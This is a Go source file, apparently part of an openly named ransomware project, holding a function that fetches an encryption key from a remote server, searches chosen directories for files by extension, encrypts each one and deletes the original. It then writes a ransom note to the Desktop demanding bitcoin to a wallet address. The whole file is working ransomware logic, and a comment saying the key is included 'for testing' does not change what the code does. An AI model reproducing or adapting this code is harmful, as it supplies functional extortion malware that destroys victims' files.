package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/utils"
)

func encryptFiles() {
	res, err := client.CallServer("api/generatekeypair")
	if err != nil {
		log.Fatal("Probably the server is down or not accepting connections. Aborting...")
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	keys, err := client.ParseServerJson(body)
	if err != nil {
		log.Fatalf("%s. Aborting...", err)
	}

	log.Println("Walking interesting dirs and indexing files...")

	for _, f := range InterestingDirs {
		folder := BaseDir + f
		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
			ext := filepath.Ext(path)
			if ext != "" {
				if utils.StringInSlice(ext[1:], InterestingExtensions) {
					MatchedFiles = append(MatchedFiles, path)
					log.Println("Matched:", path)
				}
			}
			return nil
		})
	}

	for _, path := range MatchedFiles {
		log.Printf("Encrypting %s...\n", path)
		text, _ := ioutil.ReadFile(path)

		ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
		if err != nil {
			log.Println(err)
			continue
		}

		ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)

		os.Remove(path)
	}

	if len(MatchedFiles) > 0 {
		message := `
		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG 
		AES-256 ALGORITHM.

		YOUR IDENTIFICATION IS %s

		PLEASE SEND %s TO THE FOLLOWING WALLET 

				      %s

		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
		FILES

		# The enc key is inserted for testing
		# ENCRYPTION KEY: %s

		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
		%s decrypt yourkeyhere
		`
		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", keys["enckey"], os.Args[0]))

		ioutil.WriteFile(BaseDir+"Desktop\\READ_TO_DECRYPT.txt", content, 0600)

		log.Println("Done! Don't forget to read the READ_FOR_DECRYPT.txt file on Desktop")
	}
}
